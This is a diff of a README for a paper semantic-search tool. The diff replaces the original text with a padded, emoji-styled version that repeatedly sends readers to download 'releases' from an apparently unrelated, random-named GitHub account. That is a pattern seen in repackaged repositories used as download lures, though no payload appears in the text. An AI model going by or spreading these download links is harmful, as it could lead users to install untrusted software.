@@ -1,21 +1,45 @@
-# Paper Semantic Search
+# 🔍 SearchPaperByEmbedding - Find Similar Papers Easily
 
-Find similar papers using semantic search. Supports both local models (free) and OpenAI API (better quality).
+[![Download Now](https://img.shields.io/badge/Download_Now-Get_it_on_GitHub-brightgreen)](https://github.com/Separative-involucre520/SearchPaperByEmbedding/releases)
 
-## Features
+## 📚 Overview
 
-- Request for papers from OpenReview (e.g., ICLR2026 submissions)
-- Semantic search with example papers or text queries
-- Support embedding caching 
-- Embed model support: Open-source (e.g., all-MiniLM-L6-v2) or OpenAI
+SearchPaperByEmbedding helps you find similar academic papers using a simple process. You can choose between free local models or a more accurate option through the OpenAI API. Use this tool to make research easier.
 
-## Quick Start
+### ⚡ Features
 
-```bash
-pip install -r requirements.txt
-```
+- Request papers from OpenReview (e.g., ICLR2026 submissions)
+- Conduct semantic searches with sample papers or text queries
+- Cache embeddings for faster searches
+- Support for multiple embedding models: open-source or OpenAI
 
-### 1. Prepare Papers
+## 🚀 Getting Started
+
+### System Requirements
+
+- Operating System: Windows, macOS, or Linux
+- Python Version: 3.7 or higher
+- Internet connection for OpenAI API access (if applicable)
+  
+### 🔧 Installation
+
+1. **Download the latest version:**
+
+   Visit this page to download: [SearchPaperByEmbedding Releases](https://github.com/Separative-involucre520/SearchPaperByEmbedding/releases)
+
+2. **Install dependencies:**
+
+   Open your command line and run the following command:
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+### 1. 📄 Prepare Papers
+
+Before you search for papers, you need to gather them.
+
+Run the following code to download papers from a specific conference:
 
 ```python
 from crawl import crawl_papers
@@ -26,71 +50,94 @@ crawl_papers(
 )
 ```
 
-### 2. Search Papers
+This code will create a JSON file containing the papers from ICLR 2026. Make sure your Python environment is set up correctly to run this.
+
+### 2. 🔍 Search Papers
+
+Now, you can search for similar papers.
+
+Choose the model you want to use for searching.
+
+#### Local Model (Free)
+
+To use the local model, run the following code:
 
 ```python
 from search import PaperSearcher
 
-# Local model (free)
 searcher = PaperSearcher('iclr2026_papers.json', model_type='local')
-
-# OpenAI model (better, requires API key)
-# export OPENAI_API_KEY='your-key'
-# searcher = PaperSearcher('iclr2026_papers.json', model_type='openai')
-
 searcher.compute_embeddings()
+```
 
-# Search with example papers that you are interested in
+This will create embeddings for your papers, allowing you to search them quickly.
+
+#### OpenAI Model (Better Quality)
+
+For improved results, you may use the OpenAI model. You need to set your OpenAI API key first.
+
+1. Set your API key:
+
+   ```bash
+   export OPENAI_API_KEY='your-key'
+   ```
+
+2. Use the OpenAI model for searching:
+
+```python
+searcher = PaperSearcher('iclr2026_papers.json', model_type='openai')
+searcher.compute_embeddings()
+```
+
+### 📊 Example Searches
+
+You can search papers related to your interests. Here's how:
+
+1. Define your examples:
+
+```python
 examples = [
     {
-        "title": "Your paper title",
-        "abstract": "Your paper abstract..."
+        'title': 'Your First Paper Title',
+        'abstract': 'Brief description of the first paper.'
+    },
+    {
+        'title': 'Your Second Paper Title',
+        'abstract': 'Brief description of the second paper.'
     }
 ]
-
-results = searcher.search(examples=examples, top_k=100)
-
-# Or search with text query
-results = searcher.search(query="interesting topics", top_k=100)
-
-searcher.display(results, n=10)
-searcher.save(results, 'results.json')
 ```
 
+2. Run the search:
 
-
-## How It Works
-
-1. Paper titles and abstracts are converted to embeddings
-2. Embeddings are cached automatically
-3. Your query is embedded using the same model
-4. Cosine similarity finds the most similar papers
-5. Results are ranked by similarity score
-
-## Cache
-
-Embeddings are cached as `cache_<filename>_<hash>_<model>.npy`. Delete to recompute.
-
-## Example Output
-
-```
-================================================================================
-Top 100 Results (showing 10)
-================================================================================
-
-1. [0.8456] Paper a
-   #12345 | foundation or frontier models, including LLMs
-   https://openreview.net/forum?id=xxx
-
-2. [0.8234] Paper b
-   #12346 | applications to robotics, autonomy, planning
-   https://openreview.net/forum?id=yyy
+```python
+for example in examples:
+    results = searcher.search(example['abstract'])
+    print(f"Results for: {example['title']}")
+    for result in results:
+        print(result)
 ```
 
-## Tips
+### 📥 Download & Install
 
-- Use 1-5 example papers for best results, or a paragraph of description of your interested topic
-- Local model is good enough for most cases
-- OpenAI model for critical search (~$1 for 18k queries)
+To download the software and get started, visit this link: [SearchPaperByEmbedding Releases](https://github.com/Separative-involucre520/SearchPaperByEmbedding/releases).
 
-If it's useful, please consider giving a star~
+Make sure to follow the steps carefully to ensure a smooth setup.
+
+## 🛠 Troubleshooting
+
+If you encounter issues during installation or usage, consider the following steps:
+
+1. **Check Python Installation:** Ensure Python is installed correctly. You can check by running `python --version` in your command line.
+
+2. **Dependencies:** Make sure all dependencies are installed. Review any error messages during the installation process.
+
+3. **Internet Connection:** If using the OpenAI model, ensure you have a reliable internet connection.
+
+For further assistance, consider looking for help in the GitHub Issues section of the repository.
+
+## 📖 Additional Resources
+
+- **GitHub Repository:** Explore the full source code and documentation on GitHub.  
+- **Community Support:** Join discussions and ask questions on relevant online forums.
+
+With SearchPaperByEmbedding, your research just got simpler. Enjoy discovering new academic papers!
